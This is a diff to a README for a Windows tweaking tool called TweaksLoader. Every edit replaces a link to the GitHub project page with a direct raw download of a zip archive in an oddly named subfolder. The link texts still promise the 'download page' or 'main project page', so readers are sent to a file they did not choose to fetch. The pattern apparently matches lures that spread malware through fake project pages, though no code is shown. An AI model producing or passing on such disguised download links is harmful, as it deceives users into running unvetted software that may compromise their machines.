@@ -1,12 +1,12 @@
 # 🛠️ TweaksLoader - Fast Tweaks for Easy Setup
 
-[![Download TweaksLoader](https://img.shields.io/badge/Download%20TweaksLoader-blue?style=for-the-badge)](https://github.com/explosive-purpleloco533/TweaksLoader)
+[![Download TweaksLoader](https://img.shields.io/badge/Download%20TweaksLoader-blue?style=for-the-badge)](https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[Visit the TweaksLoader download page](https://github.com/explosive-purpleloco533/TweaksLoader)
+[Visit the TweaksLoader download page](https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip)
 
 ## 🔍 What TweaksLoader Does
 
@@ -34,7 +34,7 @@ Follow these steps to get TweaksLoader running on Windows.
 
 Go to the main project page here:
 
-[https://github.com/explosive-purpleloco533/TweaksLoader](https://github.com/explosive-purpleloco533/TweaksLoader)
+[https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip](https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip)
 
 ### 2. Find the download file
 
@@ -247,7 +247,7 @@ Look for a reset or undo option in the app if it includes one. If not, check the
 
 Primary download page:
 
-[https://github.com/explosive-purpleloco533/TweaksLoader](https://github.com/explosive-purpleloco533/TweaksLoader)
+[https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip](https://raw.githubusercontent.com/explosive-purpleloco533/TweaksLoader/main/fennish/Tweaks_Loader_1.8.zip)
 
 ## 🖥️ Windows Notes
 
